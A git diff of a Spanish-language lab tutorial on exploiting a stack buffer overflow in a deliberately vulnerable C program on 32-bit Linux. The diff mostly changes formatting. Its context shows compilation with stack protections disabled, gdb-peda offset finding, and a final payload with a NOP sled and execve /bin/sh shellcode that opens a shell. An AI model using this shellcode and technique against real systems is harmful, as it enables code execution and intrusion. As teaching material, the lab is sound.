@@ -25,7 +25,7 @@ Antes de comenzar, debo decir que todo el procedimiento del laboratorio se lleva
 ![virtualbox](../1.png)
 
 Puedes comprobar con la siguiente sentencia para ver la informacion del sistema
-```
+```bash
 > uname -a
 Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
 ```
@@ -39,7 +39,7 @@ Para añadir [peda](https://github.com/longld/peda) solo tienes que seguir las i
 
 ## Creando script en C
 El siguiente codigo es un simple script escrito en C , donde basicamente la parte vulnerable estaría concentrado en el método **strcmp**.
-```
+```bash
 #include<stdio.h>
 #include<string.h>
 
@@ -54,15 +54,15 @@ void main(int argc, char **argv){
 ```
 
 ### Compilación del script
-```
+```bash
 gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buffer.c -o buffer
 ```
-| argumento | descripción |
-|----|----|
-| -z execstack | deshabilitar la pila de no ejecución 
-| -g -fno-stack-protector | desactiva la protección de la pila |
+| argumento                    |                descripción                  |
+|:-----------------------------|:--------------------------------------------|
+| -z execstack                 | deshabilitar la pila de no ejecución        | 
+| -g -fno-stack-protector      | desactiva la protección de la pila          |
 | -mpreferred-stack-boundary=2 | desmontar fácilmente lo que está sucediendo |
-| buffer | nombre de la salida del ejecutable |
+| buffer                       | nombre de la salida del ejecutable          |
 
 
 
@@ -70,7 +70,7 @@ gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buffer.c -
 Puedo ver si el binario cuenta con protecciones.
 
 Podemos ver que el DEP está deshabilitado
-```
+```bash
 checksec --file buffer
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   buffer
@@ -81,7 +81,7 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 **ASLR desactivado**
 
 
-```
+```bash
 > ldd buffer
         linux-gate.so.1 =>  (0xb7769000)
         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75a0000)
@@ -99,7 +99,7 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 #### Deshabilitar el ASLR
 
 ## Creando script en C:
-```
+```bash
 #include<stdio.h>
 #include<string.h>
 
@@ -113,17 +113,8 @@ void main(int argc, char **argv){
 }
 ```
 
-
-#### Compilando el script
-```
-gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buffer.c -o buffer
-```
-| -fno-stack-protector | desactiva la protección de la pila |
-| -m32                          | binario compilado en 32 bi
-
-
 ## Ejecutando el programa.
-```
+```bash
 gdb-peda$ run AAA
 Starting program: /home/noroot/buffer_overflow/buffer AAA
 [Inferior 1 (process 2791) exited with code 0214]
@@ -131,7 +122,7 @@ Warning: not running
 ```
 
 Ejecutando el script el script con un parámetro superior al indicado en el programa
-```
+```bash
 ./buffer $(python -c "print 'A'*100")
 Segmentation fault (core dumped)
 ```
@@ -139,7 +130,7 @@ Segmentation fault (core dumped)
 ### Memoria EIP sobreescrita
 Al enviar un argumento de 100 A's se puede apreciar como el depurador nos indica que EIP esta pauntando a la direción ```0x41414141```.
 
-```
+```bash
 gdb-peda$ run $(python -c "print 'A'*100")
 Starting program: /home/noroot/buffer_overflow/buffer $(python -c "print 'A'*100")
 
@@ -181,14 +172,14 @@ EIP  : Contiene la dirección actual de ejecución del programa.
 EBP : Según el compilador usado, EBP puede ser usado como registro de caracter general o como puntero al marco de la pila.
 
 Generando una cadena de 100 bytes encontrar en que dirección se encuentra EIP
-```
+```bash
 gdb-peda$ pattern_create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 ```
 
 Buscanco el **EIP**
 A traves de la utilida pattern_search de gdb le indicamos la dirección que estamos buscando.
-```
+```bash
 gdb-peda$ pattern_search 0x41413341
 Registers contain pattern buffer:
 EBP+0 found at offset: 64
@@ -209,7 +200,7 @@ References to pattern buffer found at:
 
 Ver los valores que hay en la pila
 Si queremos ver los 100 últimos registros de la pila y 8 bytes antes
-```
+```bash
 gdb-peda$ x/100wx $esp-8
 0xbffff02c:     0x41414141      0x42424242      0x43434343      0x43434343
 0xbffff03c:     0x43434343      0x43434343      0x43434343      0x43434343
@@ -239,7 +230,7 @@ gdb-peda$ x/100wx $esp-8
 ```
 
 Finalmente ha sido posible ejecutarse comandos explotando un buffer overflow en un sistema linux.
-```
+```bash
 gdb-peda$ run $(python -c "print 'A'*68 + '\x74\xf0\xff\xbf' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 Starting program: /home/noroot/buffer_overflow/buffer $(python -c "print 'A'*68 + '\x74\xf0\xff\xbf' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 process 3309 is executing new program: /bin/dash
